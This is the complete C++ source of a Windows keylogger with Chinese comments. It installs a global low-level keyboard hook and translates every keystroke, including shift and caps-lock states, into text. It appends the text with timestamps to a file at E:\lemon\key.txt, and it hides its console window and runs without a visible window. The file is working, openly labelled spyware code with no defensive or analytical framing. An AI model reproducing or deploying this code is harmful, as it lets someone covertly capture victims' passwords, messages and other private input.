#include <windows.h>
#include <fstream>
#include <string>
#include <ctime>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:WinMainCRTStartup")

std::ofstream logFile;
std::string logPath = "E:\\lemon\\key.txt";

// 获取当前时间字符串
std::string GetCurrentTimeString() {
    time_t now = time(0);
    struct tm* tstruct = localtime(&now);  // 使用 localtime
    char buf[80];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", tstruct);
    return buf;
}

// 使用switch case判断按键
std::string GetKeyString(int vkCode, bool shiftPressed, bool capsLock) {
    std::string keyString = "";
    
    switch (vkCode) {
        // 功能键
        case VK_ESCAPE: return "[ESC]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        
        // 数字键 (0-9)
        case 0x30: return shiftPressed ? ")" : "0";
        case 0x31: return shiftPressed ? "!" : "1";
        case 0x32: return shiftPressed ? "@" : "2";
        case 0x33: return shiftPressed ? "#" : "3";
        case 0x34: return shiftPressed ? "$" : "4";
        case 0x35: return shiftPressed ? "%" : "5";
        case 0x36: return shiftPressed ? "^" : "6";
        case 0x37: return shiftPressed ? "&" : "7";
        case 0x38: return shiftPressed ? "*" : "8";
        case 0x39: return shiftPressed ? "(" : "9";
        
        // 字母键 (A-Z)
        case 0x41: 
        case 0x42: case 0x43: case 0x44: case 0x45: case 0x46:
        case 0x47: case 0x48: case 0x49: case 0x4A: case 0x4B:
        case 0x4C: case 0x4D: case 0x4E: case 0x4F: case 0x50:
        case 0x51: case 0x52: case 0x53: case 0x54: case 0x55:
        case 0x56: case 0x57: case 0x58: case 0x59: case 0x5A:
            if ((capsLock && !shiftPressed) || (!capsLock && shiftPressed)) {
                return std::string(1, (char)vkCode); // 大写
            } else {
                return std::string(1, (char)(vkCode + 32)); // 小写
            }
        
        // 符号键
        case VK_OEM_1: return shiftPressed ? ":" : ";";
        case VK_OEM_PLUS: return shiftPressed ? "+" : "=";
        case VK_OEM_COMMA: return shiftPressed ? "<" : ",";
        case VK_OEM_MINUS: return shiftPressed ? "_" : "-";
        case VK_OEM_PERIOD: return shiftPressed ? ">" : ".";
        case VK_OEM_2: return shiftPressed ? "?" : "/";
        case VK_OEM_3: return shiftPressed ? "~" : "`";
        case VK_OEM_4: return shiftPressed ? "{" : "[";
        case VK_OEM_5: return shiftPressed ? "|" : "\\";
        case VK_OEM_6: return shiftPressed ? "}" : "]";
        case VK_OEM_7: return shiftPressed ? "\"" : "'";
        
        // 控制键
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_RETURN: return "[ENTER]\n";
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_LSHIFT: return "[SHIFT]";
        case VK_RSHIFT: return "[SHIFT]";
        case VK_LCONTROL: return "[CTRL]";
        case VK_RCONTROL: return "[CTRL]";
        case VK_LMENU: return "[ALT]";
        case VK_RMENU: return "[ALT]";
        case VK_LWIN: return "[WIN]";
        case VK_RWIN: return "[WIN]";
        case VK_APPS: return "[MENU]";
        case VK_SPACE: return " ";
        
        // 导航键
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_HOME: return "[HOME]";
        case VK_END: return "[END]";
        case VK_PRIOR: return "[PAGEUP]";
        case VK_NEXT: return "[PAGEDOWN]";
        
        // 方向键
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        
        // 小键盘
        case VK_NUMLOCK: return "[NUMLOCK]";
        case VK_NUMPAD0: return "0";
        case VK_NUMPAD1: return "1";
        case VK_NUMPAD2: return "2";
        case VK_NUMPAD3: return "3";
        case VK_NUMPAD4: return "4";
        case VK_NUMPAD5: return "5";
        case VK_NUMPAD6: return "6";
        case VK_NUMPAD7: return "7";
        case VK_NUMPAD8: return "8";
        case VK_NUMPAD9: return "9";
        case VK_ADD: return "+";
        case VK_SUBTRACT: return "-";
        case VK_MULTIPLY: return "*";
        case VK_DIVIDE: return "/";
        case VK_DECIMAL: return ".";
        
        // 其他特殊键
        case VK_SNAPSHOT: return "[PRINTSCREEN]";
        case VK_SCROLL: return "[SCROLLLOCK]";
        case VK_PAUSE: return "[PAUSE]";
        
        default:
            return "[KEY:" + std::to_string(vkCode) + "]";
    }
}

// 键盘钩子处理函数
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        int vkCode = kbdStruct->vkCode;
        
        // 获取修饰键状态
        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        
        std::string key = GetKeyString(vkCode, shiftPressed, capsLock);
        
        if (!key.empty()) {
            logFile << key;
            logFile.flush();
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// 隐藏控制台窗口
void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

// WinMain 入口点 - 无控制台窗口
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HideConsole();

    // 创建目录
    CreateDirectory("E:\\lemon", NULL);

    // 打开日志文件
    logFile.open(logPath, std::ios::app);
    
    if (!logFile.is_open()) {
        return 1;
    }
    
    // 写入开始标记
    logFile << "\n=== Keylogger Started - " << GetCurrentTimeString() << " ===\n";
    logFile.flush();
    
    // 设置键盘钩子
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    
    if (keyboardHook == NULL) {
        logFile.close();
        return 1;
    }
    
    // 消息循环
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // 清理
    UnhookWindowsHookEx(keyboardHook);
    logFile << "\n=== Keylogger Stopped ===\n";
    logFile.close();
    
    return 0;
}